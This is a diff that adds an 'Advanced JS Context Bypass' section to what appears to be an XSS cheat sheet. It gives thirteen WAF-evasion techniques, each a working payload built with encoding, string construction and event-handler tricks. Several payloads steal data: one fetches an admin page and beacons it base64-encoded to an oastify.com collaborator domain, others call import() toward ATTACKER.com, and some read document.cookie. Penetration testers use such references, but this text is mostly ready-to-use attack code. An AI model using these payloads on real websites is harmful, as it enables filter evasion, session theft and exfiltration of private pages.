@@ -284,6 +284,171 @@ onerror=alert(1)
 alert`1`
 ```
 
+### Advanced JS Context Bypass (Unicode + HTML Entity Chaining)
+
+WAFs look for literal `<script`, `javascript:`, `alert(`, `<`, `>`. Break every token into encoded fragments the WAF won't recognize.
+
+#### Technique 1: Unicode-Escaped JavaScript URI
+```html
+<a href=&#106avascript:'%5C\u0075003C'+svg/'+'onload%5C\u0075003Dalert%5C\u00750028)\\u003E'>
+```
+**How it works:**
+- `&#106` = `j` (decimal HTML entity, WAF sees `&#106` not `j`)
+- `%5C` = `\` (backslash)
+- `\u0075` = `u` — but the sequence `\u0075003C` is actually `\u003C` with the `%5C` prefix producing `\` before it. The WAF sees escaped garbage; the browser assembles: `javascript:'\u003C'+svg/'+'onload\u003Dalert\u0028>\u003E'`
+- `\u003C` = `<`, `\u003D` = `=`, `\u0028` = `(`, `\u003E` = `>`
+- Final rendered: `javascript:'<'+svg/''+'onload=alert(>'>''` which triggers SVG onload
+
+#### Technique 2: AutoFocus + OnFocus + Optional Chaining + Comment Splitting
+```html
+1'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
+```
+**How it works:**
+- `AutoFocus` → element gets focus immediately, triggering `OnFocus`
+- `OnFocus=top/**/?.['ale'%2B'rt'](1)` → calls `alert(1)` via `top` window
+- `/**/` → JS comment between `top` and `?.` breaks WAF keyword matching (WAF looks for `alert` but sees `ale' + 'rt'`)
+- `?.` → optional chaining (modern JS syntax, many WAFs don't parse this)
+- `%2B` → `+` (URL-encoded concatenation operator)
+- `['ale'%2B'rt']` → `['ale'+'rt']` → `['alert']` → property access on `top` window
+- The WAF sees: `top`, `/**/`, `?.`, `[`, `'ale'%2B'rt'`, `]`, `(1)` — never sees `alert` as a single token
+
+#### Technique 3: Blind XSS with Admin Page Exfiltration
+```html
+<script>fetch('/admin').then(r=>r.text()).then(d=>new Image().src='//YOURDOMAIN.oastify.com/'+btoa(d))</script>
+```
+**How it works:**
+- `fetch('/admin')` — Same-origin request to admin page (bypasses CORS)
+- `.then(r=>r.text())` — Extract full HTML content
+- `.then(d=>new Image().src='//YOURDOMAIN.oastify.com/'+btoa(d))` — Base64 encode and exfiltrate via image beacon (no CSP `connect-src` restriction on images)
+- Use `oastify.com`, `burpcollaborator.net`, or `interactsh.com` for OOB DNS/HTTP callback
+- **Impact chain**: Stored XSS → admin session → exfiltrate admin dashboard → extract CSRF tokens/API keys/user lists from admin HTML
+
+#### Technique 4: Unicode Escape Chains (Character-by-Character Construction)
+WAFs block `alert`, `document`, `cookie` as keywords. Build them at runtime:
+```html
+<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">                                   <!-- alert(1) -->
+<img src=x onerror="\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074.\u0063\u006f\u006f\u006b\u0069\u0065">  <!-- document.cookie -->
+<svg/onload="\u0066\u0065\u0074\u0063\u0068('/\u0061\u0064\u006d\u0069\u006e')">          <!-- fetch('/admin') -->
+```
+**How it works:**
+- `\u0061` = `a`, `\u006c` = `l`, `\u0065` = `e`, `\u0072` = `r`, `\u0074` = `t`
+- WAF sees `\u0061\u006c\u0065\u0072\u0074` — not the literal string `alert`
+- JavaScript engine normalizes Unicode escapes in string literals
+- Works in `onerror`, `onload`, `onfocus` and all event handler contexts
+- Also works in `javascript:` URIs and `eval()` calls
+
+#### Technique 5: String.fromCharCode Construction
+```html
+<img src=x onerror="this[String.fromCharCode(115,114,99)]='x';this[String.fromCharCode(111,110,101,114,114,111,114)]=String.fromCharCode(97,108,101,114,116)(1)">
+```
+**Decoded:** `this.src='x'; this.onerror=alert(1)` — self-triggering error loop
+
+#### Technique 6: JSFuck / Non-Alphanumeric Encoding
+```html
+<!-- alert(1) without letters or numbers -->
+<img src=x onerror="[][(![]+[])[+[]]+([![]]+[][[]])[+!![]+[+[]]]+...]([])()">
+```
+Only use when all alphanumerics are blocked. Full JSFuck encoder: `jsfuck.com`
+
+#### Technique 7: Regex Source Property String Construction (No Quotes)
+Instead of string literals (blocked by WAF), use regex literal `.source` properties to build strings character by character.
+```html
+<svg onload='top[/al/.source+/ert/.source](document[/cookie/.source])'>
+<!-- /al/.source = "al", /ert/.source = "ert" → "alert" -->
+<!-- /cookie/.source = "cookie" -->
+<!-- Result: top["alert"](document["cookie"]) -->
+
+<svg onload='top[/a/.source+/l/.source+/e/.source+/r/.source+/t/.source](1)'>
+<!-- Build "alert" from 5 single-char regexes -->
+```
+**Why it works:** WAF sees regex literals `/al/`, `/ert/` — not string `"alert"`. The `.source` property extracts the pattern as a string at runtime. No quotes, no `alert` keyword, no `eval`. Combine with `top[...]` bracket notation to call any function.
+
+Even shorter — build `alert` from two regexes:
+```html
+<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
+<!-- URL-decoded: top[/al/.source+/ert/.source](document.cookie) -->
+```
+
+#### Technique 8: Dynamic import() for Data Exfiltration
+Modern JS `import()` can fetch external resources — including attacker servers with data in the path.
+```html
+<A HRef=//ATTACKER.com AutoFocus &#62 OnFocus%0C=import(href)>
+```
+**How it works:**
+- `AutoFocus` → element gets focus immediately
+- `&#62;` = `>` (decimal HTML entity, WAF sees entity not bracket)
+- `%0C` = form feed (whitespace bypass between attributes)
+- `OnFocus=import(href)` → dynamic import of the URL in `href` attribute
+- Browser sends request to `//ATTACKER.com` with referrer leaking page URL
+
+Template for custom exfiltration:
+```html
+kuromatae"><textarea/onbeforeinput=kuro=&#x27;//ATTACKER.com&#x27;;import(kuro)%09autofocus%09x>
+```
+- `&#x27;` = `'` (hex HTML entity for single quote)
+- `%09` = tab character (whitespace bypass between attribute/value pairs)
+- `import(kuro)` → fetches `//ATTACKER.com`, leaking referrer/data in request
+
+#### Technique 9: Whitespace Bypass — Form Feed (%0C) + Tab (%09)
+WAFs expect spaces between HTML attributes. Use control characters they don't inspect:
+```
+Char  | Encoding | Usage
+%0C   | Form feed | Between attribute name and value
+%09   | Tab       | Between attribute/value pairs
+%0A   | Newline   | Between attributes (some parsers)
+%0D   | CR        | Alternative to space
+```
+```html
+<A HRef=//x.com AutoFocus%0COnFocus=alert(1)>
+<textarea/onfocus=alert(1)%09autofocus%09x=1>
+```
+
+#### Technique 10: Multi-Element Payload Assembly via location=
+Split the payload across multiple DOM elements, then reassemble via `location=` navigation.
+```html
+<input id=b value=javascrip>
+<input id=c value=t:aler>
+<input id=d value=t(1)>
+<lol contenteditable onbeforeinput='location=b.value+c.value+d.value'>
+```
+**How it works:**
+- Three hidden `<input>` elements hold fragments: `javascrip` + `t:aler` + `t(1)`
+- `<lol>` (custom element) is `contenteditable` → user can interact with it
+- `onbeforeinput` fires when input is about to be inserted → navigates to assembled `javascript:alert(1)` URI
+- WAF sees harmless `<input>` elements and a custom `<lol>` tag — never sees `javascript:alert()` as a single string
+
+#### Technique 11: contenteditable + onbeforeinput (Stealth Event)
+Less-monitored event/attribute combos that WAFs don't flag:
+```html
+<lol contenteditable onbeforeinput='location=b.value+c.value+d.value'>
+<div contenteditable onbeforeinput=import(//ATTACKER.com)>
+```
+- `contenteditable` — makes any element editable, rarely inspected by WAFs
+- `onbeforeinput` — fires before input events, not in standard WAF keyword lists
+- Combined: triggers on focus/click, no `onfocus`/`onclick` keywords needed
+
+#### Technique 12: Array Indexing for Keyword Obfuscation
+Hide individual letters inside arrays — WAF looks for `alert` and `cookie` as tokens:
+```html
+"onmouseover=window['al'+'er'+(['t','b','c'][0])](document['cooki'+(['e','c','z'][0])]);"
+```
+**How it works:**
+- `['al'+'er'+(['t','b','c'][0])]` → `['al'+'er'+'t']` → `['alert']`
+- `['cooki'+(['e','c','z'][0])]` → `['cooki'+'e']` → `['cookie']`
+- Arrays look like data structures, not keyword fragments
+- String concatenation breaks regex-based keyword detection
+- WAF sees: `['al'`, `'er'`, `['t','b','c']`, `'cooki'`, `['e','c','z']` — never `alert` or `cookie`
+
+#### Technique 13: Double URL Encoding for Attribute Context
+When the application decodes input multiple times:
+```html
+<A %252F=""Href= JavaScript:k='a',top[k%2B'lert'](1)>
+```
+- `%252F` → first decode → `%2F` → second decode → `/`
+- `k='a'`, then `top[k+'lert'](1)` = `top['alert'](1)`
+- The WAF decodes once and sees `%2F`, never reaches the decoded `/`
+- String concatenated property access: `k+'lert'` never spells `alert` literally
+
 ### CSP Bypass via jQuery
 ```html
 <!-- If CSP allows jquery and 'unsafe-eval' -->
